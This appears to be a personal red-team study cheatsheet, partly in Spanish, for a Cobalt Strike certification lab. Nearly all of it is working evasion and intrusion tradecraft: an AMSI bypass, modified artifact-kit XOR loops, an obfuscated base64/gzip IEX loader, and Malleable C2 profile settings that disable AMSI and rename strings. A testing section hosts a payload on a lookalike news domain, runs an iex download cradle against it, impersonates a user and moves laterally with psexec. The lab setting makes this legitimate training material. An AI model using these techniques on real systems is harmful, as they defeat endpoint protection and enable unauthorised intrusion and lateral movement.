
# IDIOMA

- Cheatsheet extra:
https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO%20-%20Cheatsheet.md#forest--domain-trusts


- Cambiar teclado a español:

```powershell
$LangList = Get-WinUserLanguageList
$LangList.Add("es-ES")
Set-WinUserLanguageList $LangList -Force
```
> Vamos a language settings(escribes "**la**" en windows) y seleccionas español.



# EVASION

## AMSI BYPASS, lanzarlos por separado.
```powershell
#Comando 1
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')

#Comando 2
$a.SetValue($null,$true)
```

## Artifacts

1. Launch Visual Studio Code.
2. Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\arsenal-kit\kits\artifact_.
3. Navigate to _src-common_ and open _patch.c_.
4. Scroll to line ~45 and modify the _for_ loop. This is for the svc exe payloads

```c
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

5. Scroll to line ~116 and modify the other _for_ loop. This is for the normal exe payloads.
```c
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

6. Save the changes (**File > Save**) and close the folder (**File > Close Folder**).
7. On the Windows taskbar, right-click on the Terminal icon launch Ubuntu.
8. Change the working directory.
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
```
6. Run **build.sh** to build the new artifacts.
```bash
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
6. Open the Cobalt Strike client and load **artifact.cna** from _C:\Tools\cobaltstrike\custom-artifacts\mailslot_.

## Resources

1. If not already open from the previous task, launch Ubuntu from the Windows Terminal.
2. Change the working directory.
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
```
3. Run **build.sh** to build new resources.
```bash
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```
4. If not already open from the previous task, launch Visual Studio Code.
5. Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\custom-resources_.
6. Select **template.x64.ps1**.
7. Rename the **func_get_proc_address** function on line 3 to **get_proc_address**.
8. Rename the **func_get_delegate_type** function on line 10 to **get_delegate_type**.
-  Asegurate de que las variables al cambiarle el nombre tambien le cambies el nombre en todas sus llamadas
4. Scroll to line 32 and replace it with:
- Añadelo tal cual y no borres mas lineas solo metelo

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```
10. Save the changes (**File > Save**).
11. Select **compress.ps1**.
12. Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```
10. Save the changes (**File > Save**).
11. Open the Cobalt Strike client and load **resources.cna** from _C:\Tools\cobaltstrike\custom-resources_.

## Malleable C2

1. Open a new PowerShell window in Terminal.
2. SSH into the team server VM.
```bash
ssh attacker@10.0.0.5
Passw0rd!
```
3. Move into the profiles directory.
```bash
cd /opt/cobaltstrike/profiles
```
4. Open **default.profile** in a text editor (e.g. vim or nano).
5. Add the following stage block:
```c
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}
```

6. Add the following post-ex block:
```c
post-ex {
  set amsi_disable "true";
  set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}
```
7. Save the changes.
8. Restart the team server.
```bash
sudo /usr/bin/docker restart cobaltstrike-cs-1
```
If the container fails to restart properly use to see the profile errors:
```bash
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

## Testing


1. Build new payloads
```powershell
Go to **Payloads > Windows Stageless Generate All Payloads**
Folder: C:\Payloads
```

2. Host a 64-bit PowerShell payload.
    1. Go to **Site Management > Host File**
    2. File: _C:\Payloads\http_x64.ps1_
    3. Local URI: /test
    4. Local Host: www.bleepincomputer.com
3. Switch to [Workstation 1](https://labclient.labondemand.com/Instructions/a28ce94c-f300-4fca-93fd-594ac13bc4e9#) and login with Passw0rd!.
4. Open a PowerShell window.
5. Verify that Defender's Real-Time Protection is enabled.
```powershell
(Get-MpPreference).DisableRealtimeMonitoring
```
> DisableRealtimeMonitoring should return as False.
6. Download and invoke the PowerShell payload.
```powershell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
```
7. Switch back to [Attacker Desktop](https://labclient.labondemand.com/Instructions/a28ce94c-f300-4fca-93fd-594ac13bc4e9#) and a new Beacon should be checking in.
8. From the new Beacon, impersonate a local admin to _lon-ws-1_.
```powershell
beacon> make_token CONTOSO\rsteel Passw0rd!
```
7. Verify that Defender's Real-Time Protection is enabled on the target.
```powershell
beacon> remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring
```
8. Change the spawnto for the service payload.
```powershell
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```
9. Move laterally to _lon-ws-1_.
```powershell
beacon> jump psexec64 lon-ws-1 smb
```
